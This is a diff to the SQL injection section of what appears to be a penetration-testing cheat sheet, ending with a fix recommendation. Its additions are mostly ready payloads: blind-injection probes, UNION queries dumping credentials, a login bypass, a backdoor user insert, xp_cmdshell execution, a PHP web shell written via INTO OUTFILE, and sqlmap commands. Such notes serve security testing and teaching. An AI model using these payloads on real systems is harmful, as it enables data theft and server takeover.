@@ -1171,23 +1171,9 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 
 ### <ins>SQL injection</ins>
 
-**Tools**
-- [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-- [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
-- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
+**How to identify SQL injections**: Search for SQL errors, use the apex or the backtick character in parameters and analyze the response.
 
-**sqlmap**
-```
- > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
-                  --tables (to see db)
-                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
-                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
-		  -l (to parse a Burp log file)
-		  --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3		  
-		  --force-ssl --threads 5 --level 1 --risk 1 --tamper=space2comment
-```
-
-**Some payloads**
+**Some payloads for Blind SQL injections detection**
 - ```SQL
   0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
   ```
@@ -1198,12 +1184,27 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
   0'or(now()=sysdate()&&SLEEP(1))or'Z
   ```
 
+**Extract database information**
+- Extract the version: `?id=1 union all select 1, 2, @@version`
+- Extract the database user: `?id=1 union all select 1, 2, user()`
+- Extract table names: `?id=1 union all select 1, 2, table_name from information_schema.tables`
+- Extract table columns `?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`
+- An example of extracting the `users` table: `?id=1 union all select 1, username, password from users`
+
+**Authentication Bypass**
+- `tom’ or 1=1 LIMIT 1;#`
+  - `#` is a comment marker in MySQL/MariaDB
+  - `LIMIT 1` is to return a fixed number of columns and avoid errors when our payload is returning multiple rows
+
 **Insert a new user**
 ```SQL
 insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
 ```
 
-**RCE**
+**Local File Inclusion (LFI)**<br/>
+Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`
+
+**Remote Code Execution (RCE)**
 - ```SQL
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
@@ -1222,7 +1223,25 @@ insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
   GO
   xp_cmdshell 'COMMAND';
   ```
+- Write a PHP shell using the `OUTFILE` function: `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`. Then access `backdoor.php&cmd=ipconfig`.
 
+**Tools**
+- [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
+- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
+
+**sqlmap**
+```
+ > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
+                  --tables (to see db)
+                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
+                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
+		  -l (to parse a Burp log file)
+		  --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3		  
+		  --force-ssl --threads 5 --level 1 --risk 1 --tamper=space2comment
+```
+
+**How to fix SQL injections**: Use parameterized queries/prepared statements to protect against SQL injections by isolating user input from SQL code. They add placeholders for user input in SQL statements, creating a layer of isolation and preventing user input from affecting SQL code.
 
 
 ### <ins>Authentication vulnerabilities</ins>
